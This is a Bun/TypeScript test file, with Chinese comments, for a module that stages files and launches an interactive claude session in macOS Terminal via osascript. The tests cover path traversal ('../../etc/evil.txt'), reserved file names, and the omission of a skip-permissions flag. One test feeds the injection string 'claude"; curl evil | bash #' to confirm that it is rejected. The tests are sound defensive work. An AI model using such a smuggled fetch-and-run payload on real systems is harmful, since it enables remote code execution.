import { test, expect } from "bun:test";
import { runHandoff, safeFileName } from "../src/handoff";
import { setLogEnabled } from "../src/log";

setLogEnabled(false); // hermetic：不写真实 ~/.pie/logs

function harness() {
  const writes: { path: string; content: string; mode?: number }[] = [];
  const dirs: string[] = [];
  const spawns: { cmd: string; args: string[]; cwd: string }[] = [];
  const opts = {
    ensureDir: (d: string) => { dirs.push(d); },
    writeFile: (p: string, c: string, m?: number) => { writes.push({ path: p, content: c, mode: m }); },
    spawn: async (cmd: string, args: string[], cwd: string) => {
      spawns.push({ cmd, args, cwd });
      return { stdout: "", exitCode: 0 };
    },
    now: () => "2026-07-06",
  };
  return { writes, dirs, spawns, opts };
}

test("creates dated dir, writes context.md, launches via osascript do script (padded)", async () => {
  const h = harness();
  const r = await runHandoff({ target: "claude", context: "Refactor the auth module" }, h.opts);
  // 目录含日期前缀 + slug
  expect(r.dir).toContain("pie-handoffs");
  expect(r.dir).toContain("2026-07-06-refactor-the-auth-module");
  expect(h.dirs).toContain(r.dir);
  // context.md 原文落盘
  const ctx = h.writes.find((w) => w.path.endsWith("context.md"));
  expect(ctx?.content).toBe("Refactor the auth module");
  // start.command 可执行、内容 cd 进目录并拉起交互式 claude（不带 skip-permissions）
  const cmd = h.writes.find((w) => w.path.endsWith("start.command"));
  expect(cmd?.mode).toBe(0o755);
  expect(cmd?.content).toContain("exec claude");
  expect(cmd?.content).not.toContain("--dangerously-skip-permissions");
  // 用 osascript do script 唤起（不是 `open`——那条路径把脚本路径当键盘输入喂给
  // 交互式 zsh，zsh 启动期 stdin 消费者会吞首字符；见 handoff.ts LAUNCH_PAD 注释）
  expect(h.spawns).toHaveLength(1);
  expect(h.spawns[0].cmd).toBe("osascript");
  const doScript = h.spawns[0].args.find((a) => a.startsWith("do script"));
  expect(doScript).toBeDefined();
  // 注入串必须带前导牺牲空格垫片，且引用 start.command
  expect(doScript!).toContain('do script "        exec');
  expect(doScript!).toContain("start.command");
});

test("stages files with basename, neutralizing path traversal", async () => {
  const h = harness();
  await runHandoff(
    { target: "claude", context: "x", files: [{ name: "../../etc/evil.txt", content: "DATA" }] },
    h.opts,
  );
  // 遍历被中和：写在 handoff 目录内的裸名 evil.txt，不逃逸
  const staged = h.writes.find((w) => w.content === "DATA");
  expect(staged?.path.endsWith("/evil.txt")).toBe(true);
  expect(staged?.path).not.toContain("etc/evil");
});

test("safeFileName rejects reserved / empty / dot names", () => {
  expect(() => safeFileName("context.md")).toThrow();
  expect(() => safeFileName("start.command")).toThrow();
  expect(() => safeFileName("")).toThrow();
  expect(() => safeFileName("..")).toThrow();
  expect(safeFileName("notes.md")).toBe("notes.md");
  expect(safeFileName("a/b/c.txt")).toBe("c.txt");
});

test("safeFileName rejects reserved names case-insensitively (APFS/HFS+ is case-insensitive)", () => {
  expect(() => safeFileName("START.COMMAND")).toThrow();
  expect(() => safeFileName("Context.MD")).toThrow();
});

test("runHandoff never awaits claude (fire-and-forget): spawns only osascript", async () => {
  const h = harness();
  await runHandoff({ target: "claude", context: "x" }, h.opts);
  // 至少确实 spawn 了一次（否则下面的 every 在空数组上永真，删掉唤起调用也测不出来）
  expect(h.spawns.length).toBeGreaterThan(0);
  // 唯一的 spawn 是 osascript；claude 不由 daemon 直接 spawn（它住在 .command 脚本里）
  expect(h.spawns.every((s) => s.cmd === "osascript")).toBe(true);
});

test("osascript failure (e.g. TCC Automation denied) throws with manual fallback path", async () => {
  const h = harness();
  h.opts.spawn = async (cmd: string, args: string[], cwd: string) => {
    h.spawns.push({ cmd, args, cwd });
    return { stdout: "", exitCode: 1, stderr: "execution error: Not authorized to send Apple events to Terminal. (-1743)" };
  };
  await expect(runHandoff({ target: "claude", context: "x" }, h.opts)).rejects.toThrow(
    /failed to open Terminal[\s\S]*start\.command/,
  );
});

test("rejects unsupported/injected target before building the script or spawning anything", async () => {
  const h = harness();
  const evilTarget = 'claude"; curl evil | bash #';
  await expect(
    runHandoff({ target: evilTarget as any, context: "x" }, h.opts),
  ).rejects.toThrow(/unsupported handoff target/);
  // 注入必须在写脚本/拉起 open 之前就被挡下
  expect(h.writes).toHaveLength(0);
  expect(h.spawns).toHaveLength(0);
});
